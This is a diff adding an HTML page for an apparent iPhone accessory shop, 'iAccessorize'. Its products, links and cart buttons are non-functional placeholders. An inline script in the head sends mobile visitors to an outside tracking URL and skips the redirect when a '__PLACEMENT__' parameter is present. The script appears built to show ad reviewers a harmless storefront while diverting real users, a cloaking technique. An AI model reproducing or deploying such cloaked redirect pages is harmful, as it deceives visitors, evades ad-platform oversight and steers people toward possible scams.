@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/2b563712-fe69-4179-9e2f-168dcbbd0547?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") {
+    } else if (isMobileDevice) {
+        window.location.href = lander;
+    } else {
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iAccessorize: Elevate Your iPhone Experience</title>
+    <style>
+        :root {
+            --primary-color: #007AFF;
+            --secondary-color: #FF2D55;
+            --background-color: #F2F2F7;
+            --text-color: #1C1C1E;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen-Sans, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            flex: 1;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            padding: 20px;
+        }
+        .product-card {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            transition: transform 0.3s ease;
+        }
+        .product-card:hover {
+            transform: translateY(-5px);
+        }
+        .product-image {
+            height: 200px;
+            background-color: #E5E5EA;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+            color: #8E8E93;
+        }
+        .product-info {
+            padding: 15px;
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        h2 {
+            color: var(--primary-color);
+            margin-top: 0;
+        }
+        p {
+            color: #8E8E93;
+            margin-bottom: 10px;
+        }
+        .price {
+            font-weight: bold;
+            color: var(--secondary-color);
+            font-size: 1.2em;
+        }
+        .buy-button {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .buy-button:hover {
+            background-color: #0056b3;
+        }
+        footer {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 10px;
+            text-align: center;
+        }
+        nav {
+            background-color: #E5E5EA;
+            padding: 10px 0;
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+        nav li {
+            margin: 0 15px;
+        }
+        nav a {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: bold;
+        }
+        footer a {
+            color: white;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>iAccessorize</h1>
+        <p>Elevate Your iPhone Experience</p>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Cases</a></li>
+            <li><a href="#">Chargers</a></li>
+            <li><a href="#">Audio</a></li>
+            <li><a href="#">Support</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="product-card">
+            <div class="product-image">MagSafe Case</div>
+            <div class="product-info">
+                <h2>Ultra Slim MagSafe Case</h2>
+                <p>Sleek protection with magnetic alignment</p>
+                <p class="price">$39.99</p>
+                <button class="buy-button">Add to Cart</button>
+            </div>
+        </div>
+        <div class="product-card">
+            <div class="product-image">Wireless Charger</div>
+            <div class="product-info">
+                <h2>Fast Wireless Charging Pad</h2>
+                <p>15W Qi-certified for rapid charging</p>
+                <p class="price">$49.99</p>
+                <button class="buy-button">Add to Cart</button>
+            </div>
+        </div>
+        <div class="product-card">
+            <div class="product-image">AirPods Pro</div>
+            <div class="product-info">
+                <h2>AirPods Pro (2nd Generation)</h2>
+                <p>Active noise cancellation with adaptive EQ</p>
+                <p class="price">$249.99</p>
+                <button class="buy-button">Add to Cart</button>
+            </div>
+        </div>
+        <div class="product-card">
+            <div class="product-image">Screen Protector</div>
+            <div class="product-info">
+                <h2>Tempered Glass Screen Guard</h2>
+                <p>9H hardness with oleophobic coating</p>
+                <p class="price">$19.99</p>
+                <button class="buy-button">Add to Cart</button>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2024 iAccessorize. All rights reserved.</p>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
